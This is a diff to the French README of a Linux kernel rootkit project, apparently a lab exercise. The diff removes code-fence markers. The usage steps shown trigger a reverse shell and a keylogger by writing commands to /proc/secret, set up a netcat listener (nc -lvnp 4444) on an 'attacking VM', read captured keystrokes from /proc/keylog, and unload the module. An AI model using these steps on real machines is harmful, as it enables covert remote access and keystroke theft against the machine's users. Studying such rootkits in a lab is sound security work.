@@ -57,28 +57,28 @@ dmesg | tail -n 10
 3. 🧪 Tests
 ▶️ Démarrer le reverse shell
 ```echo "reverse_shell" | sudo tee /proc/secret
-```
+
 
 Il faut s'assurer que dans la vm attaquante soit prêt : 
 
 ```nc -lvnp 4444
-```
+
 
 🎹 Démarrer le keylogger
 ```echo "start_keylogger" | sudo tee /proc/secret
-```
+
 
 il faut ensuite faire quelques frappes clavier puis faire : 
 
 ```cat /proc/keylog
-```
+
 
 pour arrêter le kayloggeer, faites : 
 ```echo "stop_keylogger" | sudo tee /proc/secret
-```
+
 
 4. ❌ Désinstallation
 
 ``` sudo rmmod rootkit
-```
+
 
